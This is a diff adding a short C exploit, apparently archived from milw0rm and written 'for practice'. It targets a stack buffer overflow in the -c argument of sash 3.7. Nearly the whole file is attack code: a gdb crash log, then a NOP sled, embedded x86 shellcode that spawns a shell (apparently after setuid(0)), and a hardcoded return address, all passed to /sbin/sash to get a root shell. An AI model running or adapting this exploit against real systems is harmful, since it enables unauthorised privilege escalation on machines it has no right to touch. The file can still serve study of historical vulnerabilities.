@@ -1,0 +1,53 @@
+/*  sash-3.7 buffer overflow in c argyment
+	written by lammat for practice purposes
+		http://grpower.ath.cx
+		lammat@iname.com
+
+(gdb) r -c `perl -e 'print "A"x10256'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /sbin/sash -c `perl -e 'print "A"x10256'`
+warning: shared library handler failed to enable breakpoint
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+
+*/
+
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+
+static char shellcode[]=
+"\x31\xdb\x53\x8d\x43\x17\xcd\x80\x99\x68\x6e\x2f\x73\x68\x68"
+"\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+
+#define NOP     0x90
+#define LEN     10256
+#define RET     0xbfff7770
+
+int main()
+{
+char buffer[LEN];
+long retaddr = RET;
+int i;
+
+fprintf(stderr,"using address 0x%lx\n",retaddr);
+
+/* Filling the buffer... */
+
+for (i=0;i<LEN;i+=4)
+   *(long *)&buffer[i] = retaddr;
+
+for (i=0;i<(LEN-strlen(shellcode)-100);i++)
+   *(buffer+i) = NOP;
+
+memcpy(buffer+i,shellcode,strlen(shellcode));
+/* Executing sash */
+
+execlp("/sbin/sash","sash","-c",buffer);
+return 0;
+}
+
+// milw0rm.com [2005-04-08]
